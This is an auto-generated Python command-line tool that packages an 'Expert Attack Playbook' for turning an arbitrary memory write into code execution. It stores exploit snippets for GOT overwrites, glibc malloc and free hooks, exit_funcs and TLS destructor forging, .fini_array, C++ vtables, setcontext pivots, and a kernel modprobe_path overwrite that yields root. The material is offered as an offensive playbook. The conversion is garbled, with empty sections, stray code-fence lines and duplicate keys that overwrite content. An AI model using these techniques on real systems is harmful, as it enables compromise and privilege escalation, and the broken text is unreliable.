#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/arbitrary-write-to-rce

Skill: SKILL: Arbitrary Write to Code Execution — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-arbitrary-write-to-rce.py --help
      python hack-skills-arbitrary-write-to-rce.py --list
      python hack-skills-arbitrary-write-to-rce.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/arbitrary-write-to-rce'
TITLE = 'SKILL: Arbitrary Write to Code Execution — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: arbitrary-write-to-rce", "description: >-", "Arbitrary write to RCE playbook. Use when you have an arbitrary write primitive (from heap exploitation, format string, or OOB write) and need to convert it into code execution by targeting GOT, hooks, _IO_FILE vtable, exit_funcs, TLS_dtor_list, modprobe_path, .fini_array, or C++ vtables."],
    'skill-arbitrary-write-to-code-execution-expert-attack-playbook': [],
    '0-related-routing': ["- [heap-exploitation](../heap-exploitation/SKILL.md) \u2014 obtaining the arbitrary write via heap attacks", "- [format-string-exploitation](../format-string-exploitation/SKILL.md) \u2014 obtaining the arbitrary write via %n", "- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) \u2014 stack-based write primitives", "- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) \u2014 which targets are available given protection configuration", "- [heap-exploitation IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) \u2014 deep _IO_FILE structure exploitation"],
    '1-target-selection-by-glibc-version': [],
    '2-got-overwrite': ["**Replace a function pointer in the Global Offset Table.**"],
    'requirements': ["- Partial RELRO (`.got.plt` writable) \u2014 Full RELRO blocks this entirely"],
    'common-targets': ["```python"],
    'format-string-got-overwrite': ["from pwn import fmtstr_payload", "payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})"],
    'heap-based-got-overwrite-tcache-poisoning': [],
    'allocate-chunk-at-got-address-write-system-address': [],
    '3-malloc-hook-free-hook-glibc-2-34': [],
    'malloc-hook': ["```python"],
    'overwrite-malloc-hook-with-one-gadget-address': [],
    'triggered-by-any-malloc-call-including-internal-malloc-in-printf-with-large-format': ["write(libc.sym['__malloc_hook'], one_gadget_addr)"],
    'trigger': ["io.sendline('%100000c')  # printf calls malloc internally for large format"],
    'free-hook': ["```python"],
    'overwrite-free-hook-with-system': ["write(libc.sym['__free_hook'], libc.sym['system'])"],
    'trigger-free-a-chunk-containing-bin-sh': ["chunk_data = b'/bin/sh\\x00'"],
    'allocate-chunk-with-this-data-then-free-it': [],
    'realloc-trick-for-one-gadget-constraints': ["```python"],
    'one-gadget-often-requires-specific-register-stack-state': [],
    'realloc-pushes-registers-and-adjusts-stack-before-calling-realloc-hook': [],
    'set-malloc-hook-realloc-n-skip-some-pushes-to-adjust-stack-alignment': [],
    'set-realloc-hook-one-gadget': ["write(libc.sym['__realloc_hook'], one_gadget)", "write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 etc. to adjust"],
    '4-io-file-vtable': ["See [IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) for full details."],
    'quick-summary-by-version': [],
    'fsop-trigger': ["```python"],
    'overwrite-io-list-all-fake-file-with-crafted-vtable': [],
    'trigger-via-exit-or-malloc-abort-io-flush-all-lockp-io-overflow': [],
    '5-exit-funcs-atexit': ["// __exit_funcs is a linked list of function pointer entries called during exit()", "// Each entry contains a flavor (cxa, on, at) and a function pointer", "// Function pointers are MANGLED with pointer guard:", "//   stored = ROL(ptr ^ __pointer_chk_guard, 0x11)"],
    'exploitation': ["```python"],
    'need-libc-base-pointer-chk-guard-value-at-fs-0x30-or-leaked': [],
    '1-leak-or-brute-force-pointer-guard': [],
    '2-compute-mangled-function-pointer': ["import struct", "def mangle(ptr, guard):", "return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff"],
    '3-write-mangled-one-gadget-system-to-exit-funcs-entry': [],
    '4-trigger-call-exit-or-return-from-main': [],
    'without-pointer-guard-knowledge': ["If you can overwrite both the function pointer AND the pointer guard (in TLS at `fs:[0x30]`):", "1. Set pointer guard to 0", "2. Set function pointer to `ROL(target, 0x11)`", "3. Demangling: `ROR(stored, 0x11) ^ 0 = ROR(ROL(target, 0x11), 0x11) = target`"],
    '6-tls-dtor-list-glibc-2-34': ["**Thread-local destructor list \u2014 the primary post-2.34 target.**", "// Called during __call_tls_dtors() in exit flow", "// Each entry: { void (*func)(void *), void *obj, void *next }", "// func is MANGLED same as exit_funcs (PTR_DEMANGLE)"],
    'location': ["TLS area (pointed by fs register on x86-64)", "tls_dtor_list is a thread-local variable in libc", "Typically at fs:[offset] \u2014 offset found via libc symbol or brute-force"],
    'exploitation': ["```python"],
    '1-leak-tls-base-address-e-g-via-canary-leak-canary-at-fs-0x28': [],
    '2-compute-tls-dtor-list-address': [],
    '3-forge-a-tls-dtor-list-entry': ["entry = p64(mangled_func_ptr)  # func (mangled with pointer guard)", "entry += p64(arg_value)         # obj (passed as argument to func)", "entry += p64(0)                 # next = NULL (end of list)"],
    '4-write-entry-to-heap-set-tls-dtor-list-to-point-to-it': [],
    '5-trigger-exit-call-tls-dtors-func-obj': [],
    '7-dl-fini-link-map-corruption': [],
    'attack-vector': ["During `exit()`, `_dl_fini` iterates the link_map list and calls `DT_FINI_ARRAY` entries.", "// In _dl_fini:", "for each loaded library (link_map entry):", "if l_info[DT_FINI_ARRAY]:", "array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr", "for each entry in array:", "entry()  // call destructor"],
    'exploitation': ["1. Corrupt a `link_map` entry's `l_addr` (relocation base) to shift the FINI_ARRAY pointer", "2. Or corrupt `l_info[DT_FINI_ARRAY]` to point to fake array", "3. Fake array contains target function pointer (system, one_gadget)", "4. Trigger: `exit()` \u2192 `_dl_fini` \u2192 calls fake destructor", "**Advantage**: No pointer mangling (function pointers in FINI_ARRAY are not mangled)."],
    '8-modprobe-path-kernel': ["**Overwrite the kernel's `modprobe_path` to execute arbitrary commands as root.**", "```python"],
    '1-arbitrary-kernel-write-overwrite-modprobe-path-sbin-modprobe': [],
    'with-tmp-x-attacker-s-script': ["kernel_write(modprobe_path_addr, b'/tmp/x\\x00')"],
    '2-prepare-script': [],
    'echo-bin-sh-tmp-x': [],
    'echo-cat-flag-tmp-output-tmp-x': [],
    'chmod-x-tmp-x': [],
    '3-trigger-execute-a-file-with-unknown-binary-format': [],
    'echo-ne-xff-xff-xff-xff-tmp-trigger': [],
    'chmod-x-tmp-trigger': [],
    'tmp-trigger': [],
    'kernel-calls-modprobe-path-tmp-x-as-root': ["See [kernel-exploitation](../kernel-exploitation/SKILL.md) for kernel write primitives."],
    '9-fini-array': ["**Overwrite destructor function pointers called during normal program exit.**", "```python"],
    'fini-array-contains-function-pointers-called-in-reverse-order-during-exit': [],
    'typically-do-global-dtors-aux': [],
    'overwrite-first-entry-with-target-main-for-loop-system-for-rce': [],
    'two-stage-fini-array-0-main-loop-back-fini-array-1-exploit-func': [],
    'first-exit-calls-fini-array-1-exploit-func-then-fini-array-0-main': [],
    'in-main-loop-set-up-final-exploit': ["**Limitation**: `.fini_array` may be read-only in Full RELRO binaries."],
    '10-c-vtable-overwrite': ["```cpp", "// C++ objects with virtual functions have a vptr at offset 0", "// vptr \u2192 vtable \u2192 array of function pointers", "// Overwrite vptr to point to fake vtable with controlled function pointers", "// Object layout:", "// +0x00: vptr \u2192 [vtable_entry_0, vtable_entry_1, ...]", "// +0x08: member data...", "```python"],
    '1-leak-object-address-and-vptr': [],
    '2-create-fake-vtable-in-controlled-memory': ["fake_vtable = p64(0)              # offset -0x10 (RTTI info)", "fake_vtable += p64(0)             # offset -0x08 (RTTI info)", "fake_vtable += p64(target_func)   # virtual function 0 \u2192 system / one_gadget", "fake_vtable += p64(target_func)   # virtual function 1"],
    '3-overwrite-vptr-to-point-to-fake-vtable-0x10-skip-rtti-prefix': [],
    '4-trigger-call-virtual-function-on-the-object': [],
    '11-setcontext-gadget': ["`setcontext` in libc loads registers from a `ucontext_t` structure \u2014 useful as a pivot gadget."],
    'glibc-2-29': ["// setcontext+53: loads registers from [rdi + offsets]", "// RDI = first argument = pointer to controlled buffer", "// Sets RSP, RIP, and all other registers \u2192 full control"],
    'glibc-2-29': ["// setcontext+61: loads registers from [rdx + offsets]", "// Must control RDX, not RDI", "// Need an intermediate gadget: mov rdx, [rdi+X]; ... ; call/jmp [rdx+Y]", "```python"],
    'common-pattern-with-free-hook-pre-2-34': [],
    'free-hook-setcontext-61': [],
    'free-chunk-setcontext-chunk-where-chunk-contains-fake-ucontext': [],
    'from-ucontext-set-rsp-to-rop-chain-rip-to-ret-rop-continues': [],
    'post-2-34-combine-with-io-file-exploitation': [],
    'io-file-vtable-call-passes-fp-as-first-arg-use-gadget-to-move-to-rdx-setcontext': [],
    '12-decision-tree': ["You have an arbitrary write primitive. What to target?", "\u251c\u2500\u2500 What's the RELRO level?", "\u2502   \u251c\u2500\u2500 None / Partial \u2192 GOT overwrite (simplest, most reliable)", "\u2502   \u2502   \u2514\u2500\u2500 printf\u2192system, free\u2192system, atoi\u2192system", "\u2502   \u2514\u2500\u2500 Full RELRO \u2192 GOT read-only, choose alternative:", "\u251c\u2500\u2500 What glibc version?", "\u2502   \u251c\u2500\u2500 < 2.34 (hooks available)", "\u2502   \u2502   \u251c\u2500\u2500 __free_hook = system \u2192 free(\"/bin/sh\") [easiest]", "\u2502   \u2502   \u251c\u2500\u2500 __malloc_hook = one_gadget \u2192 trigger malloc [if constraints met]", "\u2502   \u2502   \u2514\u2500\u2500 __realloc_hook + __malloc_hook realloc trick [adjust stack alignment]", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 \u2265 2.34 (no hooks)", "\u2502   \u2502   \u251c\u2500\u2500 Know pointer guard (fs:[0x30])?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 YES \u2192 __exit_funcs or TLS_dtor_list", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 NO \u2192 overwrite pointer guard to 0 first, then exit_funcs", "\u2502   \u2502   \u251c\u2500\u2500 _IO_FILE + _IO_wfile_jumps (House of Apple 2 / Cat)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Need: libc base + heap address + controllable FILE structure", "\u2502   \u2502   \u251c\u2500\u2500 _dl_fini link_map corruption", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Need: ld.so base address", "\u2502   \u2502   \u2514\u2500\u2500 .fini_array (if writable)", "\u2502   \u2502       \u2514\u2500\u2500 Need: binary base (no PIE, or PIE base leaked)", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 Any version", "\u2502       \u251c\u2500\u2500 Stack return address (if stack address known)", "\u2502       \u2514\u2500\u2500 C++ vtable (if targeting C++ object with virtual functions)", "\u251c\u2500\u2500 Kernel write primitive?", "\u2502   \u251c\u2500\u2500 modprobe_path (simplest kernel\u2192root)", "\u2502   \u251c\u2500\u2500 core_pattern (/proc/sys/kernel/core_pattern)", "\u2502   \u2514\u2500\u2500 Direct cred structure overwrite", "\u2514\u2500\u2500 Need to chain read \u2192 write \u2192 execute?", "\u2514\u2500\u2500 setcontext gadget: arbitrary write \u2192 pivot RSP \u2192 ROP chain", "\u251c\u2500\u2500 glibc < 2.29: setcontext+53 (uses RDI)", "\u2514\u2500\u2500 glibc \u2265 2.29: setcontext+61 (uses RDX, need mov rdx, [rdi] gadget)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()